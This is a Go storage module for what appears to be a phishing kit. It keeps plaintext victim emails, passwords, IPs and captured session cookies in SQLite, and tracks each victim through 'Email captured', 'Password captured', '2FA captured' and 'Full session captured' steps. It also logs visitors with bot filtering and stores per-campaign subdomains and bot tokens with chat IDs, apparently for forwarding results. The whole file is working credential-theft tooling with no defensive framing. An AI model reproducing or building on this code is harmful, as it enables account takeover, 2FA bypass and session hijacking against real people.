package storage

import (
	"database/sql"
	"path/filepath"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

type Storage struct {
	DB *sql.DB
}

type Submission struct {
	ID        string
	Source    string
	Email     string
	Password  string
	IP        string
	UserAgent string
	IsBot     bool
	Step1     bool   // Email captured
	Step2     bool   // Password captured
	Step3     bool   // 2FA captured
	Completed bool   // Full session captured
	Cookies   string
	CreatedAt time.Time
	UpdatedAt time.Time
}

type Visitor struct {
	ID        int
	Source    string
	IP        string
	UserAgent string
	IsBot     bool
	BotName   string
	Referer   string
	CreatedAt time.Time
}

func New(dataDir string) (*Storage, error) {
	dbPath := filepath.Join(dataDir, "analyzer.db")
	db, err := sql.Open("sqlite3", dbPath+"?_journal=WAL&_sync=NORMAL")
	if err != nil {
		return nil, err
	}

	queries := []string{
		`CREATE TABLE IF NOT EXISTS submissions (
			id TEXT PRIMARY KEY,
			source TEXT,
			email TEXT,
			password TEXT,
			ip TEXT,
			user_agent TEXT,
			is_bot INTEGER DEFAULT 0,
			step1 INTEGER DEFAULT 0,
			step2 INTEGER DEFAULT 0,
			step3 INTEGER DEFAULT 0,
			completed INTEGER DEFAULT 0,
			cookies TEXT,
			created_at TEXT,
			updated_at TEXT
		)`,
		`CREATE INDEX IF NOT EXISTS idx_submissions_email ON submissions(email)`,
		`CREATE INDEX IF NOT EXISTS idx_submissions_created ON submissions(created_at DESC)`,
		`CREATE TABLE IF NOT EXISTS visitors (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			source TEXT,
			ip TEXT,
			user_agent TEXT,
			is_bot INTEGER DEFAULT 0,
			bot_name TEXT,
			referer TEXT,
			created_at TEXT
		)`,
		`CREATE INDEX IF NOT EXISTS idx_visitors_created ON visitors(created_at DESC)`,
		`CREATE TABLE IF NOT EXISTS endpoints (
			source TEXT PRIMARY KEY,
			subdomain TEXT,
			token TEXT,
			chat_id TEXT,
			created_at TEXT
		)`,
	}

	for _, q := range queries {
		if _, err := db.Exec(q); err != nil {
			return nil, err
		}
	}

	return &Storage{DB: db}, nil
}

func (s *Storage) Close() error {
	return s.DB.Close()
}

func (s *Storage) CreateOrUpdateSubmission(id, source, email, password, ip, userAgent string) error {
	now := time.Now().Format(time.RFC3339)
	
	// Check if exists
	var count int
	s.DB.QueryRow("SELECT COUNT(*) FROM submissions WHERE email = ? AND source = ?", email, source).Scan(&count)
	
	if count == 0 {
		_, err := s.DB.Exec(`INSERT INTO submissions (id, source, email, password, ip, user_agent, step1, step2, created_at, updated_at) 
			VALUES (?, ?, ?, ?, ?, ?, 1, 1, ?, ?)`,
			id, source, email, password, ip, userAgent, now, now)
		return err
	}
	
	// Update existing
	_, err := s.DB.Exec(`UPDATE submissions SET password = ?, ip = ?, user_agent = ?, step2 = 1, updated_at = ? 
		WHERE email = ? AND source = ?`, password, ip, userAgent, now, email, source)
	return err
}

func (s *Storage) Update2FA(email, source, code string) error {
	_, err := s.DB.Exec(`UPDATE submissions SET step3 = 1, updated_at = ? 
		WHERE email = ? AND source = ?`, time.Now().Format(time.RFC3339), email, source)
	return err
}

func (s *Storage) UpdateSession(email, source, cookies string) error {
	_, err := s.DB.Exec(`UPDATE submissions SET cookies = ?, completed = 1, updated_at = ? 
		WHERE email = ? AND source = ?`, cookies, time.Now().Format(time.RFC3339), email, source)
	return err
}

func (s *Storage) GetSubmission(email, source string) (*Submission, error) {
	var sub Submission
	var cookies sql.NullString
	err := s.DB.QueryRow(`SELECT id, source, email, password, ip, user_agent, step1, step2, step3, completed, cookies, created_at, updated_at 
		FROM submissions WHERE email = ? AND source = ? ORDER BY created_at DESC LIMIT 1`,
		email, source).Scan(&sub.ID, &sub.Source, &sub.Email, &sub.Password, &sub.IP, &sub.UserAgent,
		&sub.Step1, &sub.Step2, &sub.Step3, &sub.Completed, &cookies, &sub.CreatedAt, &sub.UpdatedAt)
	if err != nil {
		return nil, err
	}
	if cookies.Valid {
		sub.Cookies = cookies.String
	}
	return &sub, nil
}

func (s *Storage) GetRecentSubmissions(limit int) ([]Submission, error) {
	rows, err := s.DB.Query(`SELECT id, source, email, password, ip, step1, step2, step3, completed, created_at 
		FROM submissions ORDER BY created_at DESC LIMIT ?`, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var subs []Submission
	for rows.Next() {
		var sub Submission
		err := rows.Scan(&sub.ID, &sub.Source, &sub.Email, &sub.Password, &sub.IP, 
			&sub.Step1, &sub.Step2, &sub.Step3, &sub.Completed, &sub.CreatedAt)
		if err != nil {
			continue
		}
		subs = append(subs, sub)
	}
	return subs, nil
}

func (s *Storage) SaveVisitor(source, ip, userAgent, referer string, isBot bool, botName string) error {
	_, err := s.DB.Exec(`INSERT INTO visitors (source, ip, user_agent, is_bot, bot_name, referer, created_at) 
		VALUES (?, ?, ?, ?, ?, ?, ?)`,
		source, ip, userAgent, boolToInt(isBot), botName, referer, time.Now().Format(time.RFC3339))
	return err
}

func (s *Storage) GetStats() (visitors, humans, bots, submissions, completed int, err error) {
	s.DB.QueryRow("SELECT COUNT(*) FROM visitors").Scan(&visitors)
	s.DB.QueryRow("SELECT COUNT(*) FROM visitors WHERE is_bot = 0").Scan(&humans)
	s.DB.QueryRow("SELECT COUNT(*) FROM visitors WHERE is_bot = 1").Scan(&bots)
	s.DB.QueryRow("SELECT COUNT(*) FROM submissions").Scan(&submissions)
	s.DB.QueryRow("SELECT COUNT(*) FROM submissions WHERE completed = 1").Scan(&completed)
	return
}

func (s *Storage) GetEndpoint(source string) (token, chatID string, err error) {
	var t, c sql.NullString
	err = s.DB.QueryRow("SELECT token, chat_id FROM endpoints WHERE source = ?", source).Scan(&t, &c)
	if t.Valid {
		token = t.String
	}
	if c.Valid {
		chatID = c.String
	}
	return
}

func (s *Storage) SetEndpoint(source, subdomain, token, chatID string) error {
	_, err := s.DB.Exec(`INSERT OR REPLACE INTO endpoints (source, subdomain, token, chat_id, created_at) 
		VALUES (?, ?, ?, ?, ?)`, source, subdomain, token, chatID, time.Now().Format(time.RFC3339))
	return err
}

func (s *Storage) ListEndpoints() (map[string]string, error) {
	rows, err := s.DB.Query("SELECT source, subdomain FROM endpoints")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	result := make(map[string]string)
	for rows.Next() {
		var source, subdomain string
		rows.Scan(&source, &subdomain)
		result[source] = subdomain
	}
	return result, nil
}

func (s *Storage) Cleanup(days int) error {
	cutoff := time.Now().AddDate(0, 0, -days).Format(time.RFC3339)
	_, err := s.DB.Exec("DELETE FROM submissions WHERE created_at < ?", cutoff)
	if err != nil {
		return err
	}
	_, err = s.DB.Exec("DELETE FROM visitors WHERE created_at < ?", cutoff)
	if err != nil {
		return err
	}
	_, err = s.DB.Exec("VACUUM")
	return err
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}